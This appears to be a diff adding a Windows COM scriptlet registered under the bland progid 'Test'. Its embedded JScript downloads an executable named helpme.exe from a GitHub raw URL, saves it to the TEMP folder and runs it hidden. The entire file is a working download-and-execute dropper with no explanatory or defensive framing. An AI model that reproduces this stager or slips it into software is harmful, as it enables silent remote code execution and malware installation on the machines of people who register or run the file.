@@ -1,0 +1,23 @@
+﻿<?XML version="1.0"?>
+<scriptlet>
+<registration
+    progid="Test"
+    classid="{A1112221-0000-0000-0000-0000FEEDC0DE}" >
+</registration>
+<script language="JScript">
+<![CDATA[
+    var Win = new ActiveXObject("WScript.Shell");
+    var http = new ActiveXObject("MSXML2.XMLHTTP");
+    http.open("GET", "https://raw.githubusercontent.com/jarred09170/cache/main/helpme.exe", false);
+    http.send();
+    var stream = new ActiveXObject("ADODB.Stream");
+    stream.Open();
+    stream.Type = 1;
+    stream.Write(http.responseBody);
+    var temp = Win.ExpandEnvironmentStrings("%TEMP%") + "\\helpme.exe";
+    stream.SaveToFile(temp, 2);
+    stream.Close();
+    Win.Run(temp, 0, false);
+]]>
+</script>
+</scriptlet>
